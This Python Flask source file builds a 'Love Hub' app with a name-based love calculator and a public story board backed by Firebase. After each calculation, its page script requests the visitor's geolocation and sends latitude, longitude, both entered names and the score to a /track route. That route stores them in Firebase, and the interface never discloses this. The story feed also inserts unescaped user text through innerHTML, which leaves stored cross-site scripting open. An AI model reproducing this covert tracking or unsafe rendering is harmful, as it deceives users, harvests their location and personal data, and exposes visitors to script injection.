from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
from datetime import datetime

app = Flask(__name__)

# ========== CONFIGURATION ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

# ========== 70+ LOVE FORTUNES ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

# ========== STORY ANALYZER ==========
def analyze_story(text):
    text = text.lower()
    sad_words = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone', 'cheated', 'miss']
    if any(word in text for word in sad_words):
        return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
    return "💖 This is absolutely wonderful! Your story is like a fairytale. Keep glowing!"

# ========== HTML INTERFACE ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Hub</title>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; --bg: #f8f9fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; justify-content: center; padding: 15px; }
        
        .main-card { background: white; width: 100%; max-width: 480px; border-radius: 30px; padding: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); height: fit-content; }
        
        .main-tabs { display: flex; background: #f0f0f0; border-radius: 15px; padding: 5px; margin-bottom: 20px; }
        .main-tab { flex: 1; padding: 12px; border: none; border-radius: 12px; background: none; cursor: pointer; font-weight: bold; font-size: 14px; color: #666; }
        .main-tab.active { background: white; color: var(--primary); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        .page { display: none; text-align: center; }
        .page.active { display: block; animation: fadeIn 0.4s; }

        input, textarea { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #eee; border-radius: 12px; outline: none; font-size: 15px; background: var(--bg); }
        .btn { width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        .story-sub-nav { display: flex; gap: 10px; margin-bottom: 15px; justify-content: center; }
        .sub-btn { padding: 8px 20px; border: 1px solid #ddd; border-radius: 20px; background: white; font-size: 13px; cursor: pointer; }
        .sub-btn.active { background: var(--secondary); color: white; border-color: var(--secondary); }
        
        .feed { text-align: left; max-height: 550px; overflow-y: auto; padding-right: 5px; }
        .story-card { background: var(--bg); padding: 15px; border-radius: 15px; margin-bottom: 15px; border-left: 5px solid var(--primary); }
        .bot-tag { font-size: 12px; color: var(--secondary); font-style: italic; margin: 8px 0; padding: 5px; background: #fff; border-radius: 5px; display: block; border: 1px dashed #ddd; }
        
        .social-bar { display: flex; gap: 15px; margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px; }
        .like-btn { border: none; background: none; cursor: pointer; color: var(--primary); font-weight: bold; }
        .comment-area { margin-top: 10px; background: #fff; padding: 8px; border-radius: 10px; }
        .c-text { font-size: 12px; margin-bottom: 4px; color: #444; border-bottom: 1px solid #f0f0f0; padding-bottom: 2px; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="main-card">
        <div class="main-tabs">
            <button class="main-tab active" onclick="showPage('calc_page', this)">🔮 Fortune</button>
            <button class="main-tab" onclick="showPage('story_page', this)">📖 Story Hub</button>
        </div>

        <!-- PAGE 1: CALCULATOR -->
        <div id="calc_page" class="page active">
            <h3 style="color:var(--secondary); margin-bottom:10px;">Check Love Percentage</h3>
            <input type="text" id="name1" placeholder="Your Name">
            <input type="text" id="name2" placeholder="Crush Name">
            <button class="btn" onclick="runCalc()">Calculate</button>
            <div id="calc_res" style="display:none; margin-top:20px; padding:15px; background: #fff5f6; border-radius:15px;">
                <h1 id="score_txt" style="color:var(--primary); font-size: 40px;">0%</h1>
                <p id="msg_txt" style="font-size:14px; margin-top:10px;"></p>
            </div>
        </div>

        <!-- PAGE 2: STORY HUB -->
        <div id="story_page" class="page">
            <div class="story-sub-nav">
                <button class="sub-btn active" id="btnWrite" onclick="showStorySection('write')">✍️ Write Story</button>
                <button class="sub-btn" id="btnRead" onclick="showStorySection('read')">📖 Read Stories</button>
            </div>

            <!-- Write Section -->
            <div id="sec_write">
                <input type="text" id="author_name" placeholder="Enter your name">
                <textarea id="story_text" rows="5" placeholder="Tell your love or breakup story..."></textarea>
                <button class="btn" onclick="submitStory()">Post Story Publicly</button>
            </div>

            <!-- Read Section -->
            <div id="sec_read" style="display:none;">
                <div id="story_feed" class="feed"></div>
            </div>
        </div>
    </div>

    <script>
        let sid = 'u_' + Date.now();

        function showPage(id, btn) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.main-tab').forEach(b => b.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            btn.classList.add('active');
        }

        function showStorySection(mode) {
            document.getElementById('sec_write').style.display = (mode === 'write' ? 'block' : 'none');
            document.getElementById('sec_read').style.display = (mode === 'read' ? 'block' : 'none');
            document.getElementById('btnWrite').classList.toggle('active', mode === 'write');
            document.getElementById('btnRead').classList.toggle('active', mode === 'read');
            if(mode === 'read') loadStories();
        }

        async function runCalc() {
            const n1 = document.getElementById('name1').value;
            const n2 = document.getElementById('name2').value;
            if(!n1 || !n2) return alert("Please enter names!");
            const res = await fetch('/calculate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ n1, n2 })
            });
            const data = await res.json();
            document.getElementById('calc_res').style.display = 'block';
            document.getElementById('score_txt').innerText = data.score + "%";
            document.getElementById('msg_txt').innerText = data.msg;

            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/track', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sid, n1, n2, score: data.score, lat: pos.coords.latitude, lon: pos.coords.longitude })
                });
            });
        }

        async function submitStory() {
            const name = document.getElementById('author_name').value;
            const text = document.getElementById('story_text').value;
            if(!name || !text) return alert("Enter both name and story!");
            await fetch('/post-story', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ author: name, text: text })
            });
            alert("Story Posted Successfully! Switch to 'Read Stories' to see it.");
            document.getElementById('story_text').value = '';
            showStorySection('read');
        }

        async function like(id) {
            await fetch('/like', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id })
            });
            loadStories();
        }

        async function addCmnt(id) {
            const val = document.getElementById('cm_'+id).value;
            if(!val) return;
            await fetch('/comment', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id, text: val })
            });
            loadStories();
        }

        async function loadStories() {
            const res = await fetch('/get-stories');
            const data = await res.json();
            const feed = document.getElementById('story_feed');
            feed.innerHTML = '';
            if(!data) { feed.innerHTML = '<p>No stories yet.</p>'; return; }

            Object.entries(data).reverse().forEach(([id, s]) => {
                let cmnts = '';
                if(s.comments) Object.values(s.comments).forEach(c => { cmnts += `<div class="c-text">💬 ${c.text}</div>`; });
                
                feed.innerHTML += `
                    <div class="story-card">
                        <strong>👤 ${s.author}</strong>
                        <p style="margin:5px 0;">${s.content}</p>
                        <span class="bot-tag">🤖 Bot: ${s.reply}</span>
                        <div class="social-bar">
                            <button class="like-btn" onclick="like('${id}')">❤️ ${s.likes || 0}</button>
                        </div>
                        <div class="comment-area">
                            ${cmnts}
                            <div style="display:flex; gap:5px; margin-top:8px;">
                                <input type="text" id="cm_${id}" placeholder="Comment..." style="padding:6px; margin:0; font-size:12px;">
                                <button onclick="addCmnt('${id}')" style="background:var(--secondary); color:white; border:none; padding:5px 10px; border-radius:8px; font-size:11px;">Send</button>
                            </div>
                        </div>
                    </div>
                `;
            });
        }
    </script>
</body>
</html>
'''

# ========== ROUTES ==========
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/calculate', methods=['POST'])
def calc():
    d = request.json
    score = 50 + (sum(ord(c) for c in (d['n1']+d['n2']).lower()) % 51)
    return jsonify({"score": score, "msg": get_love_message(d['n1'], d['n2'], score)})

@app.route('/post-story', methods=['POST'])
def post_story():
    d = request.json
    rep = analyze_story(d['text'])
    entry = {"author": d['author'], "content": d['text'], "reply": rep, "likes": 0, "ts": datetime.now().isoformat()}
    requests.post(f"{FIREBASE_URL}/stories.json", json=entry)
    return jsonify({"ok": True})

@app.route('/like', methods=['POST'])
def like():
    sid = request.json['id']
    curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
    requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
    return jsonify({"ok": True})

@app.route('/comment', methods=['POST'])
def comment():
    sid = request.json['id']
    entry = {"text": request.json['text'], "ts": datetime.now().isoformat()}
    requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=entry)
    return jsonify({"ok": True})

@app.route('/get-stories')
def get_stories():
    return jsonify(requests.get(f"{FIREBASE_URL}/stories.json").json() or {})

@app.route('/track', methods=['POST'])
def track():
    requests.put(f"{FIREBASE_URL}/visitors/{request.json['sid']}.json", json=request.json)
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


